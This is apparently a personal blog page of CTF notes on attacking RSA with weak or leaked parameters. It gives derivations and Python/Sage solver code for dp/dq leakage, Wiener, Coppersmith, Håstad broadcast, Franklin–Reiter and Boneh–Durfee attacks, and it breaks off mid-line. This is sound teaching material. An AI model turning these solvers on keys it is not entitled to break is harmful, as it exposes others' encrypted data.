<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GF</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    p = a</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">g</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a,b,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">x,e,p</span>):</span><br><span class="line">    GF(p)</span><br><span class="line">    y = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> g(y, (p-<span class="number">1</span>)//e) == <span class="number">1</span>:</span><br><span class="line">        y = random.randint(<span class="number">1</span>, p-<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(y)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;find&quot;</span>)</span><br><span class="line">    <span class="comment">#p-1 = e^t*s</span></span><br><span class="line">    t = <span class="number">1</span></span><br><span class="line">    s = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> p % e == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(t)</span><br><span class="line">    s = p // (e**t)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;e&#x27;</span>, e)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;p&#x27;</span>, p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;s&#x27;</span>, s)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;t&#x27;</span>, t)</span><br><span class="line">    <span class="comment"># s|ralpha-1</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span>((s * k + <span class="number">1</span>) % e != <span class="number">0</span>):</span><br><span class="line">        k += <span class="number">1</span></span><br><span class="line">    alpha = (s * k + <span class="number">1</span>) // e</span><br><span class="line">    a = g(y, (e ** (t - <span class="number">1</span>) ) * s)</span><br><span class="line">    b = g(x, e * alpha - <span class="number">1</span>)</span><br><span class="line">    c = g(y, s)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, t-<span class="number">1</span>):</span><br><span class="line">        d = g(b,e**(t-<span class="number">1</span>-i))</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = -math.log(d,a)</span><br><span class="line">        b = b * (g(g(c, e), j))</span><br><span class="line">        h = h * g(c, j)</span><br><span class="line">        c = g(c, e)</span><br><span class="line">    root = (g(x, alpha * h)) % p</span><br><span class="line">    roots = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(e):</span><br><span class="line">        mp2 = root * g(a,i) % p</span><br><span class="line">        roots.add(mp2)</span><br><span class="line">    <span class="keyword">return</span> roots</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> m: <span class="comment"># edit</span></span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<h1>RSA_LEAKAGE</h1>
<h2 id="Leakage-d">Leakage_d</h2>
<p><strong>Use RSAConverter</strong>.</p>
<ul>
<li>$n$, $d$, hex(), delete <code>0x</code></li>
<li>$e$, hex(), delete <code>x</code></li>
</ul>
<h2 id="Leakage-dp-dq">Leakage_dp&amp;dq</h2>
<p><strong>Dedection and keypoint</strong>!</p>
<p>Prepare and make a definition to $d_p$ and $d_q$.<br>
$$<br>
d_p \equiv d \mod p-1<br>
$$</p>
<p>$$<br>
d_q \equiv d \mod q-1<br>
$$</p>
<p>After deductions, we can get four significant equations or relations.<br>
$$<br>
q \times InvQ \equiv 1 \mod p<br>
$$</p>
<p>$$<br>
m_p \equiv c^{d_p} \mod p<br>
$$</p>
<p>$$<br>
m_q \equiv c^{d_q} \mod q<br>
$$</p>
<p>$$<br>
m \equiv  (((m_p - m_q)\times InvQ)\mod p)\times q + m_q<br>
$$</p>
<p>And make the equations convert to codes. Here is the main function:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Leakage_dp_dq</span>(<span class="params">dp, dq, p, q, c</span>):</span><br><span class="line">    InvQ = gmpy2.invert(q, p)</span><br><span class="line">    mp = gmpy2.powmod(c, dp, p)</span><br><span class="line">    mq = gmpy2.powmod(c, dq, q)</span><br><span class="line">    m = (((mp-mq)*InvQ)%p)*q + mq</span><br><span class="line">    <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
<h2 id="Leakage-dp">Leakage_dp</h2>
<h3 id="basic">basic</h3>
<p><strong>Known</strong>:<br>
$$<br>
d_p \equiv d \mod (p-1)<br>
$$</p>
<p>$$<br>
d\times e \equiv 1\mod N \equiv 1 \mod (p-1)(q-1) \tag{1}<br>
$$</p>
<p>Make full use of the two known equations and deduce the key condition to obtain the final $p$ and $q$.<br>
$$<br>
d_p \times e \equiv d \times e \mod (p-1) \equiv de + k_1(p-1) \tag{2}<br>
$$<br>
Substitute  <code>(2)</code> to <code>(1)</code>:<br>
$$<br>
k_1(p-1) + d_p e = 1 + k_2(p-1)(q-1)<br>
$$</p>
<p>$$<br>
d_pe - 1 = (p-1)[k_2(q-1) -k_1]<br>
$$</p>
<p>Assume $k_2(q-1) - k_1$ is $x$, and $x$ is range from 0 and $e$, and we can figure out the $p$ from the equation:<br>
$$<br>
p = \frac{d_{p} e-1}{x} + 1<br>
$$<br>
If we brute the $p$ in range(0, e) and $q = n \div p$ is prime or Integer, we will get the true $p$ and $q$. The code is as follows:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Leakage_dp</span>(<span class="params">n,e,dp,c</span>):</span><br><span class="line">     <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,e):  <span class="comment"># start with 1</span></span><br><span class="line">        p = (dp*e - <span class="number">1</span>)//i + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n%p == <span class="number">0</span>:</span><br><span class="line">            q = n//p</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        N = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        d = gmpy2.invert(e, N)</span><br><span class="line">        m = gmpy2.powmod(c, d, n)</span><br><span class="line">        <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>
<h3 id="dp-extension-1-n-p-b-cdot-q">dp_extension-1 $n = p^{b} \cdot q$</h3>
<blockquote>
<p>reference: Larrozo</p>
<p>relate: [2020YCB]Power</p>
</blockquote>
<img src="/2022/11/04/22-11-04-RSA/hense_lifting.png" class="" title="hense lifting">
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">dp_hensel</span>(<span class="params">c, e, dp, p, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param b: p^b*q</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mp_ = <span class="built_in">pow</span>(c, dp, p)</span><br><span class="line">    mp = <span class="built_in">pow</span>(c, dp - <span class="number">1</span>, p)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, b - <span class="number">2</span>):</span><br><span class="line">        x = <span class="built_in">pow</span>(c - <span class="built_in">pow</span>(mp_, e), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        y = <span class="built_in">pow</span>(x * mp * invert(e, p), <span class="number">1</span>, p**(i + <span class="number">1</span>))</span><br><span class="line">        mp_ = mp_ + y</span><br><span class="line">    <span class="keyword">return</span> mp_</span><br></pre></td></tr></table></figure>
<h3 id="dp-extension-2-coppersmith-known-dp-high">dp_extension-2 coppersmith known dp high</h3>
<p>Given: $n, e, dp_0,c,k$</p>
<p><em>the $dp_0$ is the high-digits$(nbits - k)$ of dp, meaning that $dp_0 = dp &gt;&gt; k$</em></p>
<p>Solve: use the coppersmith-high p</p>
<h3 id="dp-extension-3-p-gcd-m-e-cdot-dp-m-n">dp_extension-3 $p = gcd(m^{e\cdot dp} - m, n)$</h3>
<img src="/2022/11/04/22-11-04-RSA/gcd.png" class="" title="extension">
<h1>LARGE $e$</h1>
<h2 id="Wiener-Attack">Wiener Attack</h2>
<blockquote>
<p>$d &lt; N^{0.25}$</p>
</blockquote>
<h3 id="original-deduction">original deduction</h3>
<p>From the RSA proof, we have a DEFAULT RULE:<br>
$$<br>
e\times d \equiv 1 \mod \varphi(n)<br>
$$<br>
If satisfied conditions, we will get the deduced equation:<br>
$$<br>
e \times d = k \times \varphi(n) + 1 \approx k \times \varphi(n)<br>
$$<br>
In cryptography, the $n$ is usually very large. So, we can make a connection with $\varphi(n)$:<br>
$$<br>
\varphi(n) \approx n<br>
$$<br>
Thus, we can get the final deduction:<br>
$$<br>
e\times d \approx k \times n<br>
$$</p>
<p>$$<br>
\frac{e}{n} \approx \frac{k}{d}<br>
$$</p>
<h3 id="continued-fraction">continued fraction</h3>
<p>Use <strong>Extended Euclidean Algorithm</strong>, and we will get the equation. Here is the proof-picture:</p>
<img src="/2022/11/04/22-11-04-RSA/1.jpg" class="" title="continued_fraction">
<p>For the example, we can get the continued fraction that <code>34/99 -&gt; [0, 2, 1, 10, 3]</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">continued_fra</span>(<span class="params">x,y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    continued fraction expansion</span></span><br><span class="line"><span class="string">    :param x: 分子</span></span><br><span class="line"><span class="string">    :param y: 分母</span></span><br><span class="line"><span class="string">    :return: 连分数展开列表cf[]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> y:</span><br><span class="line">        cf.append(x // y)</span><br><span class="line">        x, y = y, x % y</span><br><span class="line">    <span class="comment"># print(cf)</span></span><br><span class="line">    <span class="keyword">return</span> cf</span><br></pre></td></tr></table></figure>
<h3 id="gradual-fraction">gradual fraction</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gradual_fra</span>(<span class="params">cf</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param cf: 连分数展开</span></span><br><span class="line"><span class="string">    :return: 最后的收敛子,收敛子列表 gf[]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    c = []</span><br><span class="line">    d = []</span><br><span class="line">    c.append(<span class="number">1</span>) <span class="comment"># c[0] = 1</span></span><br><span class="line">    c.append(cf[<span class="number">0</span>]) <span class="comment"># c[1] = cf[0]</span></span><br><span class="line">    d.append(<span class="number">0</span>) <span class="comment"># d[0] = 0</span></span><br><span class="line">    d.append(<span class="number">1</span>) <span class="comment"># d[1]</span></span><br><span class="line">    gf = []</span><br><span class="line">    gf.append(cf[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(cf)+<span class="number">1</span>):</span><br><span class="line">        c.append(cf[i-<span class="number">1</span>]*c[i-<span class="number">1</span>] + c[i-<span class="number">2</span>])</span><br><span class="line">        d.append(cf[i-<span class="number">1</span>]*d[i-<span class="number">1</span>] + d[i-<span class="number">2</span>])</span><br><span class="line">        gf.append((c[i], d[i]))</span><br><span class="line">    <span class="comment"># print(gf)</span></span><br><span class="line">    <span class="keyword">return</span> c[<span class="built_in">len</span>(cf)], d[<span class="built_in">len</span>(cf)], gf</span><br></pre></td></tr></table></figure>
<h3 id="Veda’s-theorem">Veda’s theorem</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">solve_pq</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    韦达定理，求解方程：x^2+(p+q)x+pq = 0</span></span><br><span class="line"><span class="string">    :param a: x^2系数</span></span><br><span class="line"><span class="string">    :param b: x系数</span></span><br><span class="line"><span class="string">    :param c: pq</span></span><br><span class="line"><span class="string">    :return: p,q</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># par = gmpy2.isqrt(b * b - 4 * a * c)</span></span><br><span class="line">    par = gmpy2.iroot(b * b - <span class="number">4</span> * a * c, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br></pre></td></tr></table></figure>
<h3 id="main-Wiener">main Wiener</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">RSA_Wiener_Attack</span>(<span class="params">e,n</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    具体实现</span></span><br><span class="line"><span class="string">    :param e:</span></span><br><span class="line"><span class="string">    :param n:</span></span><br><span class="line"><span class="string">    :return: d</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    cf = continued_fra(e, n)</span><br><span class="line">    gf = gradual_fra(cf)[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">for</span> k, d <span class="keyword">in</span> gf[<span class="number">1</span>:]:</span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        N = (e * d - <span class="number">1</span>) // k</span><br><span class="line">        p, q = solve_pq(<span class="number">1</span>, n - N + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> p * q == n:</span><br><span class="line">            <span class="keyword">return</span> d</span><br></pre></td></tr></table></figure>
<h2 id="Boneh-Durfee-Attack">Boneh-Durfee Attack</h2>
<blockquote>
<p>$d&lt; N^{0.29}$</p>
</blockquote>
<h1>COPPPERSMITH</h1>
<h2 id="high-m">high m</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># high m</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase2</span>(<span class="params">high_m, n, c</span>):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation = <span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    m = high_m + x</span><br><span class="line">    M = m((m^<span class="number">3</span> - c).small_roots()[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(<span class="built_in">int</span>(M))[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure>
<h2 id="high-p">high p</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># high p</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase3</span>(<span class="params">high_p, n ,c</span>):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation = <span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    p = high_p + x</span><br><span class="line">    x0 = p.small_roots(X = <span class="number">2</span>^<span class="number">128</span>, beta = <span class="number">0.1</span>)[<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    P = <span class="built_in">int</span>(p(x0))</span><br><span class="line">    Q = n // P</span><br><span class="line">    <span class="keyword">assert</span> P*Q == n</span><br><span class="line">    d = inverse_mod(e, (P-<span class="number">1</span>)*(Q-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(power_mod(c, d, n))[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure>
<h2 id="low-d">low d</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># low d</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getFullP</span>(<span class="params">low_p, n</span>):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    p = x*<span class="number">2</span>^<span class="number">512</span> + low_p</span><br><span class="line">    root = (p-n).monic().small_roots(X = <span class="number">2</span>^<span class="number">128</span>, beta = <span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> root:</span><br><span class="line">        <span class="keyword">return</span> p(root[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase4</span>(<span class="params">low_d, n, c</span>):</span><br><span class="line">    maybe_p = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        p = var(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">        p0 = solve_mod([<span class="number">3</span>*p*low_d  == p + k*(n*p - p^<span class="number">2</span> - n + p)], <span class="number">2</span>^<span class="number">512</span>)</span><br><span class="line">        maybe_p += [<span class="built_in">int</span>(x[<span class="number">0</span>]) <span class="keyword">for</span> x <span class="keyword">in</span> p0]</span><br><span class="line">    <span class="comment"># print(maybe_p)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> maybe_p:</span><br><span class="line">        P = getFullP(x, n)</span><br><span class="line">        <span class="keyword">if</span> P: <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    P = <span class="built_in">int</span>(P)</span><br><span class="line">    Q = n // P</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">assert</span> P*Q == n</span><br><span class="line">    </span><br><span class="line">    d = inverse_mod(<span class="number">3</span>, (P-<span class="number">1</span>)*(Q-<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(power_mod(c, d, n))[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure>
<h2 id="crt-broadcast">crt/broadcast</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># crt/broadcast</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phase5</span>(<span class="params">n1, c1, n2, c2, n3, c3</span>):</span><br><span class="line">    r = CRT([c1, c2, c3], [n1, n2, n3])</span><br><span class="line">    m = <span class="built_in">int</span>(r)^(<span class="number">1</span>/<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(m)[<span class="number">2</span>:]</span><br></pre></td></tr></table></figure>
<h2 id="Franklin–Reiter-related-message-attack">Franklin–Reiter related-message attack</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n  =</span><br><span class="line">c1 = </span><br><span class="line">c2 = </span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">g1 = x^e - c1</span><br><span class="line">g2 = (x+<span class="number">1</span>)^e - c2</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MyGcd</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">if</span> y == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> x.monic()</span><br><span class="line">    <span class="keyword">return</span> MyGcd(y, x%y)</span><br><span class="line"></span><br><span class="line">v = MyGcd(g2, g1)</span><br><span class="line">M = n - v.coefficients()[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> g1(M) == <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(M)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>
<h2 id="Boneh-Burfee-Attack">Boneh Burfee Attack</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Boneh Burfee Attack</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this </span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span> <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> (a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># if another vector is affected:</span></span><br><span class="line">                <span class="comment"># we increase the count</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:0</span></span><br><span class="line">            <span class="comment"># if no other vectors end up affected</span></span><br><span class="line">            <span class="comment"># we remove it</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vector&quot;</span>, ii)</span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">            <span class="comment"># level:1</span></span><br><span class="line">            <span class="comment"># if just one was affected we check</span></span><br><span class="line">            <span class="comment"># if it is affecting someone else</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># if it is affecting even one vector</span></span><br><span class="line">                    <span class="comment"># we give up on this one</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># remove both it if no other vector was affected and</span></span><br><span class="line">                <span class="comment"># this helpful vector is not helpful enough</span></span><br><span class="line">                <span class="comment"># compared to our unhelpful one</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;* removing unhelpful vectors&quot;</span>, ii, <span class="string">&quot;and&quot;</span>, affected_vector_index)</span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1,-1 if `strict=true`, and determinant doesn&#x27;t bound</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    finds a solution if:</span></span><br><span class="line"><span class="string">    * d &lt; N^delta</span></span><br><span class="line"><span class="string">    * |x| &lt; e^delta</span></span><br><span class="line"><span class="string">    * |y| &lt; e^0.5</span></span><br><span class="line"><span class="string">    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)</span><br><span class="line">    Q = PR.quotient(x*y 